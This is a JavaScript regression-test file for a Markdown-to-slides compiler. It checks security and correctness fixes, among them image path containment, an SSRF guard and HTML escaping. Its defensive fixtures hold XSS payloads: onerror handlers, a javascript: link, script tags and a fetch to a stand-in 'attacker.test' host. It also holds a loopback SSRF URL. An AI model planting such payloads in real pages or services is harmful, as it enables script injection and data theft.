/**
 * Regression guards for the fixes of the pre-publication review (2026-07-19).
 *
 * Each test pins a REAL defect that had survived the previous passes,
 * together with the scenario that triggers it — so that a regression shows.
 */

import './setup.mjs'; // hermetic even when invoked directly (see setup.mjs)
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { compileHtml } from '../src/html/render.mjs';
import { parseDeck } from '../src/deck/parse.mjs';
import { buildScenes } from '../src/deck/layout.mjs';
import { validateDeck } from '../src/deck/validate.mjs';
import { setFrontmatterKey } from '../src/vendor.mjs';
import { fetchKitArchive } from '../src/kit/archive.mjs';

const PIXEL = path.join(path.dirname(new URL(import.meta.url).pathname), 'fixtures', 'pixel.png');
const scenesFor = (source) => buildScenes(parseDeck(source));
const codes = (source, opts) => validateDeck(source, opts).map((d) => d.code);

// ---------------------------------------------------------------------------
// B2 — containment of local images (arbitrary file read)
// ---------------------------------------------------------------------------

test('B2: a local image outside the deck directory is neither embedded nor passed over in silence', async (t) => {
  const secretDir = fs.mkdtempSync(path.join(os.tmpdir(), 'lutrin-secret-'));
  const deckDir = fs.mkdtempSync(path.join(os.tmpdir(), 'lutrin-deck-'));
  t.after(() => {
    fs.rmSync(secretDir, { recursive: true, force: true });
    fs.rmSync(deckDir, { recursive: true, force: true });
  });
  // a real image file, but STORED SOMEWHERE OTHER than the deck
  const secret = path.join(secretDir, 'secret.png');
  fs.copyFileSync(PIXEL, secret);

  for (const src of [secret, path.relative(deckDir, secret)]) {
    const deck = `# Leak\n\n![background](${src})\n`;
    // validation refuses it explicitly (an error, not a mere absence)
    assert.ok(
      codes(deck, { baseDir: deckDir }).includes('IMAGE_PATH_ESCAPE'),
      `IMAGE_PATH_ESCAPE expected for ${src}`,
    );
    // the rendering does not embed it: a placeholder, no base64 data
    const { slides } = await compileHtml(deck, { baseDir: deckDir, fragment: true });
    const html = slides.join('\n');
    assert.doesNotMatch(html, /data:image/, 'no image may be embedded');
    assert.match(html, /placeholder/, 'a placeholder is shown instead');
  }
});

test('B2: an explicit trust root (vault/project) re-allows the image', async (t) => {
  const rootDir = fs.mkdtempSync(path.join(os.tmpdir(), 'lutrin-vault-'));
  const deckDir = path.join(rootDir, 'notes');
  const attDir = path.join(rootDir, 'media');
  fs.mkdirSync(deckDir);
  fs.mkdirSync(attDir);
  t.after(() => fs.rmSync(rootDir, { recursive: true, force: true }));
  const img = path.join(attDir, 'logo.png');
  fs.copyFileSync(PIXEL, img);

  // the deck lives in notes/, the image in a sibling directory — outside baseDir
  // but under the vault root: this is the Obsidian attachments case
  const deck = `# OK\n\n![background](${img})\n`;
  assert.ok(
    !codes(deck, { baseDir: deckDir, imageRoots: [rootDir] }).includes('IMAGE_PATH_ESCAPE'),
    'a trust root covering the image must lift the refusal',
  );
  const { slides } = await compileHtml(deck, {
    baseDir: deckDir,
    imageRoots: [rootDir],
    fragment: true,
  });
  assert.match(slides.join('\n'), /data:image\/png/, 'the allowed image is indeed embedded');
});

// ---------------------------------------------------------------------------
// I1 — setFrontmatterKey no longer corrupts a deck starting with "---"
// ---------------------------------------------------------------------------

test('I1: a deck opened by a "---" rule receives a fresh frontmatter, intact', () => {
  const src = '---\n# Slide 1\n\n---\n\n# Slide 2\n';
  const out = setFrontmatterKey(src, 'assets', 'vendor');
  assert.ok(out.startsWith('---\nassets: vendor\n---\n\n'), 'a fresh frontmatter is prefixed');
  const deck = parseDeck(out);
  assert.equal(deck.meta.assets, 'vendor', 'the key is honored');
  const scenes = buildScenes(deck);
  assert.deepEqual(
    scenes.map((s) => s.title),
    ['Slide 1', 'Slide 2'],
    'both original slides are preserved',
  );
});

test('I1: an empty head block is not mangled (assets: vendor---)', () => {
  const out = setFrontmatterKey('---\n\n---\n# Slide\n', 'assets', 'vendor');
  assert.doesNotMatch(out, /vendor---/, 'the opening delimiter is not destroyed');
  assert.equal(parseDeck(out).meta.assets, 'vendor');
});

test('I1: a real frontmatter is edited in place, its keys preserved', () => {
  const out = setFrontmatterKey('---\ntitle: X\n---\n\n# D\n', 'assets', 'vendor');
  const { meta } = parseDeck(out);
  assert.equal(meta.title, 'X');
  assert.equal(meta.assets, 'vendor');
});

// ---------------------------------------------------------------------------
// M3 — a quote says what it drops
// ---------------------------------------------------------------------------

test('M3: a list and an image inside a quote → QUOTE_CONTENT_DROPPED', () => {
  const src = '# T\n\n> A paragraph\n>\n> - a bullet\n>\n> ![x](photo.png)\n';
  const [slide] = parseDeck(src).slides;
  const quote = slide.sections.flatMap((s) => s.blocks).find((b) => b.type === 'quote');
  assert.deepEqual([...quote.dropped].sort(), ['bullets', 'image']);
  assert.ok(codes(src).includes('QUOTE_CONTENT_DROPPED'), 'the loss is reported');
});

test('M3: a quote of pure paragraphs reports nothing', () => {
  const src = '# T\n\n> A paragraph\n>\n> — Author\n';
  const quote = parseDeck(src)
    .slides[0].sections.flatMap((s) => s.blocks)
    .find((b) => b.type === 'quote');
  assert.equal(quote.dropped, undefined);
  assert.ok(!codes(src).includes('QUOTE_CONTENT_DROPPED'));
});

// ---------------------------------------------------------------------------
// M4 — "##" headings with no body are no longer dropped in silence
// ---------------------------------------------------------------------------

test('M4: two/three headings with no body → columns, titles kept', () => {
  const two = scenesFor('# Plan\n\n## Column A\n\n## Column B\n')[0];
  assert.equal(two.layout, 'two-columns');
  assert.ok(two.elements.length > 0, 'the headings no longer disappear');

  const three = scenesFor('# Plan\n\n## A\n\n## B\n\n## C\n')[0];
  assert.equal(three.layout, 'three-columns');
});

test('M4: a single heading under a cover stays a cover', () => {
  const [scene] = scenesFor('# Cover\n\n## A subtitle\n');
  assert.equal(scene.master, 'cover', 'the single-heading case has not changed');
});

// ---------------------------------------------------------------------------
// M5 — pie/doughnut: no more invented zero for a category with no value
// ---------------------------------------------------------------------------

test('M5: a series shorter than the categories — neither "— 0" nor silence', async () => {
  const src = '# T\n\n```chart\ntype: pie\ncategories: A, B, C, D\nSales: 10, 20\n```\n';
  const { slides } = await compileHtml(src, { fragment: true });
  const html = slides.join('\n');
  assert.match(html, /A — /, 'the category that has a value appears');
  assert.doesNotMatch(html, /C — /, 'a category with no value does not invent a 0 share');
  assert.doesNotMatch(html, /D — /, 'same');
  assert.ok(codes(src).includes('CHART_DATA_IGNORED'), 'orphan categories are reported');
});

// ---------------------------------------------------------------------------
// S1 — kit install: the private-address guard is applied
// ---------------------------------------------------------------------------

test('S1: fetchKitArchive refuses a loopback address (SSRF)', async () => {
  await assert.rejects(
    () => fetchKitArchive('https://127.0.0.1:9/kit.deckkit'),
    /Address refused/,
    'an https URL to 127.0.0.1 must be refused before any connection',
  );
});

// ---------------------------------------------------------------------------
// S8a — compiled Markdown produces a document, not code (SECURITY.md)
// ---------------------------------------------------------------------------

test('S8a: a deck with hostile Markdown comes out inert, as escaped text', async () => {
  // the title, a paragraph, a bullet, a link and a table cell each carry a
  // hostile payload; the escaping done by esc() must render them all inert
  const src = [
    '# Cover',
    '',
    '---',
    '',
    '# Content <img src=x onerror=alert(1)>',
    '',
    'A <script>fetch("//attacker.test")</script> paragraph.',
    '',
    '- bullet <img src=y onerror=alert(2)>',
    '',
    '[link](javascript:alert(3))',
    '',
    '| a | b |',
    '| --- | --- |',
    '| <script>alert(4)</script> | z |',
  ].join('\n');
  const { slides } = await compileHtml(src, { fragment: true });
  const html = slides.join('\n');
  // no ACTIVE construct: no real tag, no handler attribute on a real tag,
  // no executable URL inside an href
  assert.doesNotMatch(html, /<script/i, 'no real <script> tag');
  assert.doesNotMatch(html, /<img[^>]*\son\w+\s*=/i, 'no onerror= on a real <img>');
  assert.doesNotMatch(html, /href\s*=\s*["']?\s*javascript:/i, 'no javascript: href');
  // and the payload DOES survive in escaped form (proof that nothing was lost
  // in silence — the hostile characters are there, but inert, as text)
  assert.match(html, /&lt;script&gt;/i, 'the hostile <script> comes back out as escaped text');
});
